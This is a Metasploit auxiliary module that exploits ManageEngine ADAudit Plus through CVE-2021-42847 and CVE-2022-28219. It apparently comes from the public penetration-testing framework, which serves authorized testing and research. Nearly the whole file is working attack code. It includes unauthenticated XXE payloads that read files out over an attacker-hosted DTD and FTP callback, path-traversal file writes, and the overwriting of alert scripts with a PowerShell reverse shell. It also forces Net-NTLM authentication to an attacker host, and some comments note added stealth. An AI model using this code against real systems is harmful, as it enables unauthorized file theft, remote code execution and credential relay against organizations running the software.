##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::TcpServer
  include Msf::Handler::Reverse::Comm
  include Msf::Payload::Single
  include Msf::Payload::Windows::Powershell
  include Rex::Powershell::Command
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ManageEngine ADAudit Plus Unauthenticated File Read And Write',
        'Description' => %q{
          This module exploits unauthenticated XXE (CVE-2021-42847 and CVE-2022-28219)
          and arbitrary file write (CVE-2021-42847) vulnerabilities in ManageEngine
          ADAudit Plus in order to perform a variety of actions including arbitrary
          file read, arbitrary file write and triggering Net-NTLM authentication.

          The WRITE_FILE and OVERWRITE_ALERT_SCRIPT actions can be used to target
          ManageEngine ADAudit Plus prior to 7006, while the remaining actions affect
          versions prior to 7060 if the XXE VECTOR option is set to CVE-2022-28219
          (default).

          This module has been successfully tested against ManageEngine ADAudit Plus
          7005 running on Windows Server 2012 R2.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Naveen Sunkavally', # Initial PoC + disclosure for CVE-2022-28219
          'Ron Bowes', # Analysis for CVE-2022-28219 and implementation of FTP server
          'Moon', # CVE-2021-42847 discovery
          'Erik Wynter' # @wyntererik - Additional research on CVE-2021-42847 and Metasploit
        ],
        'References' => [
          ['CVE', '2021-42847'],
          ['CVE', '2022-28219'],
        ],
        'DisclosureDate' => '2022-07-29',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION] # added so that rubocop doesn't complain
        },
        'Actions' => [
          [ 'READ_FILE_OR_DIR', { 'Description' => 'Read the contents of a file or directory specified via FILE_OR_DIR_PATH' } ],
          [ 'WRITE_FILE', { 'Description' => 'Write a JSON-compatible (UTF-8) payload to a file specified via FILE_OR_DIR_PATH' } ],
          [ 'LIST_ALERT_SCRIPTS', { 'Description' => 'Locate and list the contents of alert_scripts/ in the ADAudit Plus install directory' } ],
          [ 'OVERWRITE_ALERT_SCRIPT', { 'Description' => 'Overwrite the contents of an existing PowerShell script in alert_scripts/ with a payload' } ],
          [ 'TRIGGER_NTLM_AUTH', { 'Description' => 'Trigger Net-NTLM authentication from the target (for hash capture/relaying via Responder/impacket-ntlmrelayx etc)' } ]
        ],
        'DefaultAction' => 'READ_FILE_OR_DIR'
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to ManageEngine ADAudit Plus', '/']),
      OptString.new('DOMAIN', [false, 'Active Directory domain that the target monitors, Required if XXE VECTOR is CVE-2022-28219 ', nil]),
      OptString.new('XXE_VECTOR', [false, 'XXE vector for obtaining file contents/directory listings (CVE-2022-28219 or CVE-2021-42847)', 'CVE-2022-28219']),
      OptString.new('FILE_OR_DIR_PATH', [false, 'Path to read or write to. For read operations this should contain forward slashes and exclude the drive', '/windows/win.ini']),
      OptString.new('ALERT_SCRIPT', [false, 'Name of an existing PowerShell script in /alert_scripts to overwrite when using OVERWRITE_ALERT_SCRIPT', nil]),
      OptString.new('CUSTOM_PAYLOAD', [false, 'Custom payload to use for WRITE_FILE and OVERWRITE_ALERT_SCRIPT. Ignored if USE_MSF_PAYLOAD is true', nil]),
      OptInt.new('SRVPORT_FTP', [true, 'Port for FTP reverse connection', 2121]),
      OptInt.new('SRVPORT_HTTP2', [true, 'Port for additional HTTP reverse connections', 8888]),
      OptBool.new('USE_MSF_PAYLOAD', [false, 'Use the cmd/windows/powershell_reverse_tcp payload for WRITE_FILE and OVERWRITE_ALERT_SCRIPT.', true]),
      OptAddressLocal.new('LHOST', [false, 'The local IP address to use for write operations with USE_MSF_PAYLOAD, or for receiving NTLM auth requests (TRIGGER_NTLM_AUTH)', nil ]),
      OptPort.new('LPORT', [false, 'The listening port to use when using USE_MSF_PAYLOAD', 4444 ]),
      Opt::RPORT(8081)
    ])

    register_advanced_options([
      OptInt.new('PATH_TRAVERSAL_DEPTH', [true, 'The number of `..\\` to prepend to the path traversal attempt when using WRITE_FILE', 20]),
      OptInt.new('FtpCallbackTimeout', [true, 'The amount of time, in seconds, the FTP server will wait for a reverse connection', 5]),
      OptInt.new('HttpUploadTimeout', [true, 'The amount of time, in seconds, the HTTP file-upload server will wait for a reverse connection', 5]),
      OptInt.new('cve_2021_42847_sleep_time', [true, 'The amount of time, in seconds, the module should sleep in between XXE attacks if XXE-VECTOR is CVE-2021-42847', 5]),
    ])
  end

  def domain
    datastore['DOMAIN']
  end

  def xxe_vector
    xv = datastore['XXE_VECTOR']
    unless xv == 'CVE-2021-42847' || xv == 'CVE-2022-28219'
      fail_with(Failure::BadConfig, "Invalid option '#{xv}'' for XXE_VECTOR. Should be CVE-2021-42847 or CVE-2022-28219")
    end

    xv
  end

  def file_or_dir_path
    datastore['FILE_OR_DIR_PATH']
  end

  def custom_payload
    datastore['CUSTOM_PAYLOAD']
  end

  def use_msf_payload
    datastore['USE_MSF_PAYLOAD']
  end

  def alert_script
    datastore['ALERT_SCRIPT']
  end

  def path_traversal_depth
    datastore['PATH_TRAVERSAL_DEPTH']
  end

  def sleep_time
    datastore['cve_2021_42847_sleep_time']
  end

  def cve_2021_42847_uri
    normalize_uri(target_uri.path, 'api', 'agent', 'tabs', 'agentGPOWatcherData')
  end

  def cve_2022_28219_uri
    normalize_uri(target_uri.path, 'api', 'agent', 'tabs', 'agentData')
  end

  def generate_domain_name
    "#{Rex::Text.rand_text_alpha_lower(5..10)}.local"
  end

  def generate_traversal_path
    # this is used for converting FILE_OR_DIR_PATH to a traversal path that will work with the CVE-2021-42847 XXE vector
    traversal_path = file_or_dir_path
    if file_or_dir_path =~ /^[a-zA-Z]{1}:/
      # the path starts with the drive. we should remove that
      traversal_path = traversal_path[2..]
    end

    # check if the path seems valid
    unless traversal_path.start_with?('/') || traversal_path.start_with?('\\')
      fail_with(Failure::BadConfig, "Invalid value #{file_or_dir_path} for FILE_OR_DIR_PATH")
    end

    if traversal_path.end_with?('/') || traversal_path.end_with?('\\')
      fail_with(Failure::BadConfig, 'FILE_OR_DIR_PATH cannot end with a slash when using WRITE_FILE')
    end

    # we actually need to delete the leading slash
    traversal_path = traversal_path[1..]

    # replace all forward slashes with double backslashes
    if traversal_path.include?('/')
      traversal_path = traversal_path.gsub('/', '\\\\')
    end

    # replace all single backward slashes with double backslashes
    if traversal_path.include?('\\')
      traversal_path = traversal_path.gsub(/\\/, '\&\&')
    end

    # generate the full traversal path based on the depth
    '..\\\\' * path_traversal_depth + traversal_path
  end

  def create_json_request_cve_2021_42847(mode, payload, payload_name = nil)
    json_post_data = {
      'isGPOData' => true,
      'DOMAIN_NAME' => @domain,
      # match the standard format for GPO GUIDs for a dash of extra stealth
      'GPO_GUID' => "{#{Rex::Text.rand_text_alphanumeric(8)}-#{Rex::Text.rand_text_alphanumeric(4)}-#{Rex::Text.rand_text_alphanumeric(4)}-#{Rex::Text.rand_text_alphanumeric(4)}-#{Rex::Text.rand_text_alphanumeric(12)}}".downcase,
      'GPO_VERSION' => rand(1..9),
      # use the same VER_FILE_NAME format as ADAudit Plus for a dash of extra stealth
      'VER_FILE_NAME' => "#{rand(1..9)}_#{Rex::Text.rand_text_numeric(18)}".downcase + '.xml'
    }

    case mode
    when 'read'
      json_post_data['xmlReport'] = payload
    when 'write'
      json_post_data['xmlReport'] = '<?xml version="1.0" encoding="utf-16"?>'
      json_post_data['Html_fileName'] = "..\\..\\..\\..\\..\\alert_scripts\\#{payload_name}" # the traversal path to alert_scripts should always be correct no matter where ADAudit Plus is installed
      json_post_data['htmlReport'] = payload
    end

    json_post_data.to_json
  end

  def create_json_request_cve_2022_28219(xml_payload)
    [
      {
        'DomainName' => @domain,
        'EventCode' => 4688,
        'EventType' => 0,
        'TimeGenerated' => 0,
        'Task Content' => xml_payload
      }
    ].to_json
  end

  def send_json_request(json_post_data, gpo_watcher_uri)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => gpo_watcher_uri,
      'ctype' => 'application/json',
      'data' => json_post_data
    })

    unless res
      fail_with(Failure::Unknown, 'Connection failed')
    end

    # the only thing we should care about here is that a response code of 200 is returned. if so, we should always continue
    unless res.code == 200
      fail_with(Failure::Unknown, "Received unexpected response code #{res.code}")
    end
  end

  def srv_host
    if ((datastore['SRVHOST'] == '0.0.0.0') || (datastore['SRVHOST'] == '::'))
      return datastore['URIHOST'] || Rex::Socket.source_address(rhost)
    end

    return datastore['SRVHOST']
  end

  def get_file_or_directory_contents(target_path)
    print_status("Getting contents for #{target_path} via XXE and FTP")

    # Generate a unique callback URL
    path = "/#{Rex::Text.rand_text_alpha(rand(8..15))}.dtd"
    full_url = "http://#{srv_host}:#{datastore['SRVPORT']}#{path}"

    # Send the username anonymous and no password so the server doesn't log in
    # with the password "Java1.8.0_51@" which is detectable
    # We use `end_tag` at the end so we can detect when the listing is over
    end_tag = Rex::Text.rand_text_alpha(rand(8..15))
    ftp_url = "ftp://anonymous:password@#{srv_host}:#{datastore['SRVPORT_FTP']}/%file;#{end_tag}"
    serve_http_file(path, "<!ENTITY % all \"<!ENTITY send SYSTEM '#{ftp_url}'>\"> %all;")

    # Start a server to handle the reverse FTP connection
    ftp_server = Rex::Socket::TcpServer.create(
      'LocalPort' => datastore['SRVPORT_FTP'],
      'LocalHost' => datastore['SRVHOST'],
      'Comm' => select_comm,
      'Context' => {
        'Msf' => framework,
        'MsfExploit' => self
      }
    )

    # build and send the request to trigger the file/dir listing via XXE
    case xxe_vector
    when 'CVE-2021-42847'
      xml_payload = "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:#{target_path}\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"#{full_url}\"> %dtd;]><data>&send;</data>"
      json_post_data = create_json_request_cve_2021_42847('read', xml_payload)
      xxe_uri = cve_2021_42847_uri
    when 'CVE-2022-28219'
      xml_payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:#{target_path}\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"#{full_url}\"> %dtd;]><data>&send;</data>"
      json_post_data = create_json_request_cve_2022_28219(xml_payload)
      xxe_uri = cve_2022_28219_uri
    end
    send_json_request(json_post_data, xxe_uri)

    ftp_client = nil
    begin
      # Wait for a connection with a timeout
      select_result = ::IO.select([ftp_server], nil, nil, datastore['FtpCallbackTimeout'])

      unless select_result && !select_result.empty?
        print_warning("FTP reverse connection for directory enumeration failed - #{ftp_url}")
        return nil
      end

      # Accept the connection
      ftp_client = ftp_server.accept

      # Print a standard banner
      ftp_client.print("220 Microsoft FTP Service\r\n")

      # We need to flip this so we can get a directory listing over multiple packets
      directory_listing = nil

      loop do
        select_result = ::IO.select([ftp_client], nil, nil, datastore['FtpCallbackTimeout'])

        # Check if we ran out of data
        if !select_result || select_result.empty?
          # If we got nothing, we're sad
          if directory_listing.nil? || directory_listing.empty?
            print_warning('Did not receive data from our reverse FTP connection')
            return nil
          end

          # If we have data, we're happy and can break
          break
        end

        # Receive the data that's waiting
        data = ftp_client.recv(256)
        if data.empty?
          # If we got nothing, we're done receiving
          break
        end

        # Match behavior with ftp://test.rebex.net
        if data =~ /^USER ([a-zA-Z0-9_.-]*)/
          ftp_client.print("331 Password required for #{Regexp.last_match(1)}.\r\n")
        elsif data =~ /^PASS /
          ftp_client.print("230 User logged in.\r\n")
        elsif data =~ /^TYPE ([a-zA-Z0-9_.-]*)/
          ftp_client.print("200 Type set to #{Regexp.last_match(1)}.\r\n")
        elsif data =~ /^EPSV ALL/
          ftp_client.print("200 ESPV command successful.\r\n")
        elsif data =~ /^EPSV/ # (no space)
          ftp_client.print("229 Entering Extended Passive Mode(|||#{rand(1025..1100)})\r\n")
        elsif data =~ /^RETR (.*)/m
          # Store the start of the listing
          directory_listing = Regexp.last_match(1)
        else
          # Have we started receiving data?
          # (Disable Rubocop, because I think it's way more confusing to
          # continue the elsif train)
          if directory_listing.nil? # rubocop:disable Style/IfInsideElse
            # We shouldn't really get here, but if we do, just play dumb and
            # keep the client talking
            ftp_client.print("230 User logged in.\r\n")
          else
            # If we're receiving data, just append
            directory_listing.concat(data)
          end
        end

        # Break when we get the PORT command (this is faster than timing out,
        # but doesn't always seem to work)
        if !directory_listing.nil? && directory_listing =~ /(.*)#{end_tag}/m
          directory_listing = Regexp.last_match(1)
          break
        end
      end
    ensure
      ftp_server.close
      if ftp_client
        ftp_client.close
      end
    end

    # Handle FTP errors (which thankfully aren't as common as they used to be)
    unless ftp_client
      print_warning("Didn't receive expected FTP connection")
      return nil
    end

    if directory_listing.nil? || directory_listing.empty?
      vprint_warning('FTP client connected, but we did not receive any data over the socket')
      return nil
    end

    # Remove PORT commands, split at \r\n or \n, and remove empty elements
    directory_listing.gsub(/PORT [0-9,]+[\r\n]/m, '').split(/\r?\n/).reject(&:empty?)
  end

  def serve_http_file(path, respond_with = '')
    # do not use SSL for the attacking web server
    if datastore['SSL']
      ssl_restore = true
      datastore['SSL'] = false
    end

    start_service({
      'Uri' => {
        'Proc' => proc do |cli, _req|
          send_response(cli, respond_with)
        end,
        'Path' => path
      }
    })

    datastore['SSL'] = true if ssl_restore
  end

  def gpo_watcher_data_check(gpo_watcher_uri)
    res = send_request_cgi({
      'uri' => gpo_watcher_uri,
      'method' => 'POST'
    })

    unless res
      return Exploit::CheckCode::Unknown("Connection failed when trying to reach the vulnerable endpoint #{gpo_watcher_uri}")
    end

    unless res.code == 200
      return Exploit::CheckCode::Safe("Target does not have vulnerable endpoint #{gpo_watcher_uri} (likely patched).")
    end

    Exploit::CheckCode::Appears("The vulnerable endpoint #{gpo_watcher_uri} is available and responds with HTTP/200")
  end

  def get_alert_scripts
    install_path = '/Program Files/ManageEngine/ADAudit Plus/' # default on most if not all vulnerable ADAudit Plus versions
    vprint_status("Attempting to locate the ADAudit Plus installation folder at #{install_path}")
    contents = get_file_or_directory_contents(install_path)
    if contents.blank?
      vprint_error("Failed to locate ADAudit Plus installation folder at #{install_path}.")
      if xxe_vector == 'CVE-2021-42847'
        # in this case the previous request will have been triggered 4 times
        # so we should sleep a few seconds to make sure that when we open the FTP server again, the incoming request won't be from the previous trigger
        print_status("XXE_VECTOR is CVE-2021-42847. Sleeping #{sleep_time} seconds before proceeding to ensure the duplicate requests for #{install_path} have been processed")
        sleep sleep_time
      end

      install_path = '/Program Files (x86)/ManageEngine/ADAudit Plus/' # may be used by some older ADAudit Plus versions so it's worth checking
      vprint_status("Attempting to locate the ADAudit Plus installation path at #{install_path}")
      contents = get_file_or_directory_contents(install_path)
      if contents.blank?
        print_error('Failed to locate ADAudit Plus installation folder.')
        return nil
      end
    end

    print_status("Found the ADAudit Plus installation folder at #{install_path}.")
    unless contents.include?('alert_scripts')
      print_error('The alert_scripts directory does not exist on the target')
      return nil
    end

    if xxe_vector == 'CVE-2021-42847'
      # in this case the previous request will have been triggered 4 times
      # so we should sleep a few seconds to make sure that when we open the FTP server again, the incoming request won't be a duplicate
      print_status("XXE_VECTOR is CVE-2021-42847. Sleeping #{sleep_time} seconds before proceeding to ensure the duplicate requests for #{install_path} have been processed")
      sleep sleep_time
    end

    alert_script_path = "#{install_path}alert_scripts/"
    print_status("Checking for existing alert scripts at #{alert_script_path}")
    contents = get_file_or_directory_contents(alert_script_path)
    if contents.blank?
      print_error('No alert scripts were found on the target')
      return nil
    end

    contents
  end

  def check
    case action.name
    when 'WRITE_FILE', 'OVERWRITE_ALERT_SCRIPT'
      # for file write the only endpoint we can use is that of cve_2021_42847_uri
      xxe_uri = cve_2021_42847_uri
    when 'READ_FILE_OR_DIR', 'LIST_ALERT_SCRIPTS', 'TRIGGER_NTLM_AUTH'
      # these actions use XXE so there can be two vectors
      # calling xxe_vector will check if XXE_VECTOR is set to a valid value and the module with fail if this is not true
      case xxe_vector
      when 'CVE-2021-42847'
        xxe_uri = cve_2021_42847_uri
      when 'CVE-2022-28219'
        xxe_uri = cve_2022_28219_uri
      end
    end
    gpo_watcher_data_check(xxe_uri)
  end

  def run
    case action.name
    when 'WRITE_FILE', 'OVERWRITE_ALERT_SCRIPT'
      if use_msf_payload
        if datastore['LHOST'].blank?
          fail_with(Failure::BadConfig, 'LHOST cannot be blank when performing write operations and USE_MSF_PAYLOAD is enabled')
        end

        if datastore['LPORT'].blank?
          fail_with(Failure::BadConfig, 'LPORT cannot be blank when performing write operations and USE_MSF_PAYLOAD is enabled')
        end
      end

      # here we use the CVE-2021-42847 filewrite, which doesn't require a valid domain
      # so if the user did not set a domain we can generate a random one
      if domain.blank?
        @domain = generate_domain_name
        vprint_status("Using domain #{@domain}")
      else
        @domain = domain
      end
    when 'READ_FILE_OR_DIR', 'LIST_ALERT_SCRIPTS', 'TRIGGER_NTLM_AUTH'
      # here we are using XXE. Let's check if a valid XXE_VECTOR was provided by calling xxe_vector (in case check was supressed by the user)
      case xxe_vector
      when 'CVE-2021-42847'
        # here we don't need a valid domain
        if domain.blank?
          @domain = generate_domain_name
          vprint_status("Using domain #{@domain}")
        else
          @domain = domain
        end
      when 'CVE-2022-28219'
        # here we need a valid domain
        if domain.blank?
          fail_with(Failure::BadConfig, 'A valid DOMAIN is required when using XXE_VECTOR CVE-2022-28219')
        else
          @domain = domain
        end
      end
    end
    send("action_#{action.name.downcase}")
  end

  def action_read_file_or_dir
    if file_or_dir_path.blank?
      fail_with(Failure::BadConfig, 'FILE_OR_DIR_PATH cannot be blank when using READ_FILE_OR_DIR')
    end

    if !file_or_dir_path.start_with?('/') || file_or_dir_path.include?('\\')
      fail_with(Failure::BadConfig, 'For read operations, FILE_OR_DIR_PATH should contain forward slashes and exclude the drive')
    end

    contents = get_file_or_directory_contents(file_or_dir_path)
    if contents.blank?
      print_status("Received empty contents for #{file_or_dir_path}")
    else
      print_good("Received the following contents for #{file_or_dir_path}:")
      contents.each { |line| print_line(line) }
    end
  end

  def action_list_alert_scripts
    contents = get_alert_scripts
    return if contents.nil?

    psh_scripts = contents.select { |i| i.end_with?('.ps1') }

    if psh_scripts.empty?
      # let's just show what we did find and call it a day
      print_error('No PowerShell scripts were found in /alert_scripts, but the following files were identified:')
      contents.each { |line| print_line(line) }
      return
    end

    print_good("Found #{psh_scripts.length} PowerShell script(s) in /alert_scripts/:")
    psh_scripts.each { |psh| print_line(psh) }
    print_status('You can overwrite any PowerShell script with a PSH reverse shell via OVERWRITE_ALERT_SCRIPT together with USE_MSF_PAYLOAD')
  end

  def action_overwrite_alert_script
    # perform a few checks for the ALERT_SCRIPT value
    if alert_script.blank?
      fail_with(Failure::BadConfig, 'ALERT_SCRIPT cannot be blank when using OVERWRITE_ALERT_SCRIPT')
    end

    if alert_script.start_with?('/') || alert_script.start_with?('\\')
      fail_with(Failure::BadConfig, 'ALERT_SCRIPT should be the name of an existing PowerShell (.ps1) script and cannot start with a (back)slash')
    end

    unless alert_script.downcase.end_with?('.ps1')
      fail_with(Failure::BadConfig, 'ALERT_SCRIPT should be the name of an existing PowerShell (.ps1) script')
    end

    if !use_msf_payload && custom_payload.blank?
      fail_with(Failure::BadConfig, "Provide a CUSTOM_PAYLOAD to write to #{alert_script} or set USE_MSF_PAYLOAD to true")
    end

    # let's make sure the ALERT_SCRIPT actually exists
    print_status("Performing sanity check to see if #{alert_script} exists...")
    contents = get_alert_scripts
    if contents.nil?
      print_warning('This action is only for overwriting existing alert scripts. Consider using WRITE_FILE instead')
      return
    end

    unless contents.include?(alert_script)
      print_error("The alert script #{alert_script} does not exist on the target.")
      print_warning('This action is only for overwriting existing alert scripts. Consider using WRITE_FILE instead')
      return
    end

    print_status("Confirmed that #{alert_script} exists in /alert_scripts")
    if use_msf_payload
      payload = generate_powershell_code('Reverse')
    else
      payload = custom_payload
    end
    print_status("Attempting to overwrite the alert script #{alert_script} with the payload")
    vprint_status("Using payload: #{payload}")

    json_post_data = create_json_request_cve_2021_42847('write', payload, alert_script)
    send_json_request(json_post_data, cve_2021_42847_uri)
    print_good("Successfully wrote the payload to #{alert_script}")
  end

  def action_write_file
    if file_or_dir_path.blank?
      fail_with(Failure::BadConfig, 'FILE_OR_DIR_PATH cannot be blank when using WRITE_FILE')
    end

    traversal_path = generate_traversal_path
    if use_msf_payload
      payload = generate_powershell_code('Reverse')
    else
      payload = custom_payload
    end
    print_status('Attempting to write the payload to ')
    vprint_status("Using payload: #{payload}")
    json_post_data = create_json_request_cve_2021_42847('write', payload, traversal_path)
    send_json_request(json_post_data, cve_2021_42847_uri)
    print_good('Successfully uploaded the payload')
  end

  def action_trigger_ntlm_auth
    if datastore['LHOST'].blank?
      fail_with(Failure::BadConfig, 'LHOST cannot be blank when using TRIGGER_NTLM_AUTH')
    end

    case xxe_vector
    when 'CVE-2021-42847'
      xml_payload = "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://#{datastore['LHOST']}\"> %xxe; ]>"
      json_post_data = create_json_request_cve_2021_42847('read', xml_payload)
      xxe_uri = cve_2021_42847_uri
    when 'CVE-2022-28219'
      xml_payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://#{datastore['LHOST']}\"> %xxe; ]>"
      json_post_data = create_json_request_cve_2022_28219(xml_payload)
      xxe_uri = cve_2022_28219_uri
    end

    print_status("Triggering Net-NTLM authentication from the target to http://#{datastore['LHOST']}")
    send_json_request(json_post_data, xxe_uri)
  end
end
